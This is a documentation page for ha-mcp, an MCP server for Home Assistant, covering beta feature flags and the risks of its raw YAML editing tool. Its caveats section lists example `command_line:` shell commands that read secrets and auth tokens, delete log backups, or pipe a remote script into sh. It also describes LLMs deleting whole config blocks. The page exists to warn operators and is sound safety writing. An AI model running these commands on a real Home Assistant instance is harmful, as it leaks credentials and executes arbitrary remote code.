# Beta Features

Some ha-mcp tools are gated behind feature flags and ship only with the **dev channel** of the add-on (or via environment variables for non-add-on installs). These tools are considered **beta**: their behavior, scope, or safety profile is still being evaluated, and they may change, stay beta indefinitely, be promoted to stable, or be removed entirely based on field experience.

Beta tools are **not available** in the stable "Home Assistant MCP Server" add-on. If you enable the dev channel add-on and flip the corresponding toggle, you accept the risks documented below for each tool.

## Current beta tools

| Tool | Toggle / env var | Rationale |
|---|---|---|
| `ha_config_set_yaml` | `enable_yaml_config_editing` (dev add-on toggle) / `ENABLE_YAML_CONFIG_EDITING=true` (env var) | Raw YAML editing of `configuration.yaml` and packages/*.yaml. Can cause silent schema failures, execute shell commands via the `command_line:` domain, or put Home Assistant into recovery mode. See caveats below. |

## How to enable

### Option 1: Dev channel add-on (Home Assistant users)

The dev channel add-on is a separate entry in the HA add-on store with slug `ha_mcp_dev` and name "Home Assistant MCP Server (Dev)". It tracks master on every push, so it always has the latest tools and beta toggles.

1. Install the **Home Assistant MCP Server (Dev)** add-on from the ha-mcp repository. See [docs/dev-channel.md](dev-channel.md) for installation details.
2. Open the add-on's **Configuration** tab.
3. Flip the beta toggle for the tool you want (for example, `enable_yaml_config_editing`).
4. Restart the add-on.

The stable add-on does not expose these toggles at all. If you want a beta tool, you must be on the dev channel.

### Option 2: Environment variable (non-add-on installs)

If you run ha-mcp outside the HA add-on (pip / uv / uvx / Docker direct / self-hosted), beta tools are gated by environment variables. Set the variable before starting the server:

```bash
# Example: enable ha_config_set_yaml
export ENABLE_YAML_CONFIG_EDITING=true
uvx ha-mcp
```

The tool registers only when its gating variable is set to `true`. Any other value (unset, `false`, `0`, empty) leaves it disabled.

## Caveats

### `ha_config_set_yaml`

Raw YAML editing bypasses Home Assistant's config-entry flow and operates directly on `configuration.yaml` and package files. Known ways an LLM using this tool can break a live HA instance, all verified against HA 2026.4.1 and all passing `ha_check_config` and `ha_restart` without error:

**Silent schema failures.** `ha_check_config` has blind spots on integration-level schema errors. The following mistakes write to disk successfully, HA boots clean, and the target entity silently does not exist — the only trace is a line in `home-assistant.log` that the user never sees:

- Legacy `- platform: template` + `sensors:` dict inside the modern `template:` block (common LLM confusion between template sensor styles)
- Modern `template:` entry using `value_template:` instead of `state:`
- Unclosed Jinja (`state: "{{ ... float * 9/5 + 32 "` — missing `}}`)
- Missing `sensor:` wrapper inside `template:`
- Bad Jinja filter names (`| tofloat(0)` instead of `| float(0)`)
- Hallucinated trigger platforms (`platform: sensor_changed`)

**`action: remove` nukes the entire top-level key.** Asking the LLM to "remove the Coin Flip sensor" can produce `ha_config_set_yaml(yaml_path="template", action="remove")`, which deletes every template sensor under `template:`, not just the one the user meant.

**`command_line:` executes shell commands as the HA container user.** The whitelist allows `command_line:` sensors because many legitimate use cases depend on it (disk usage, uptime, etc.), but the same mechanism accepts any `command:` string. A well-intentioned LLM can produce:

- `command: "cat /config/secrets.yaml"` → sensor state is the contents of `secrets.yaml`, readable via any authenticated HA API call
- `command: "rm -rf /config/home-assistant.log.*"` → deletes backups
- `command: "cat /config/.storage/auth"` → leaks refresh tokens
- `command: "curl http://example.com/x.sh | sh"` → runs arbitrary remote code

**Silent override of built-in services.** An LLM writing a plausible-looking legacy `notify:` entry can silently replace `notify.persistent_notification` (used by every "notify me when X" automation by default) with a misconfigured SMTP delivery that fails at DNS resolution, breaking notifications system-wide with no visible error.

**Recovery mode.** `!include` / `!secret` referencing a nonexistent target writes bad YAML to disk. `ha_restart` blocks, but any non-HA-MCP restart path (supervisor restart, HA UI "Restart" button, host reboot) puts HA into **recovery mode**: frontend serves HTTP 200 but no automations, integrations, or custom components are loaded. The `ha_mcp_tools` custom component fails to load in recovery mode, so `ha_config_set_yaml` cannot be used to fix its own damage — the user has to SSH, use the File Editor add-on, or `docker exec` in to hand-restore the backup.

**Per-edit backups are not restorable by any ha-mcp tool.** `backup=True` writes `www/yaml_backups/<file>.<timestamp>.bak` on every destructive call, but no ha-mcp tool can read, list, or restore those files. `ha_backup_create` / `ha_backup_restore` operate on HA's full-system snapshots, not per-edit YAML backups. Once HA is in recovery mode, recovery is filesystem-level only.

If, after reading the above, you still want this tool enabled, the operator-level expectation is:

- You are comfortable editing `configuration.yaml` directly via SSH or the File Editor add-on when things break.
- You run `ha_check_config` after every LLM-initiated edit and verify the target entity actually exists before assuming success.
- You understand that an LLM using this tool can cause damage no other ha-mcp tool can cause, and that the dedicated config-flow tools (`ha_set_config_entry_helper`, `ha_config_set_automation`, `ha_config_set_script`, `ha_config_set_dashboard`, etc.) should be preferred for anything they can express.

## Rationale

The decision to move `ha_config_set_yaml` to beta status came out of [PR #942](https://github.com/homeassistant-ai/ha-mcp/pull/942) and [discussion #936](https://github.com/homeassistant-ai/ha-mcp/discussions/936). The short version: the tool's blast radius is unique among ha-mcp tools, LLMs empirically reach for it when a dedicated tool would be correct, and gating it behind the dev channel lets stable add-on users opt out entirely while keeping the tool available to operators who explicitly want it.

## Graduating a beta tool

A beta tool can move to stable when:

1. It has been exercised by dev-channel users for at least two biweekly release cycles without new failure modes being reported.
2. Its safety profile is documented and its caveats can be mitigated by documentation or defensive tool design.
3. A maintainer decides the stable audience is ready for it.

Graduation is a conscious decision, not an automatic one. Some beta tools may stay beta indefinitely or be removed entirely if field experience shows they cannot be made safe for general stable use.
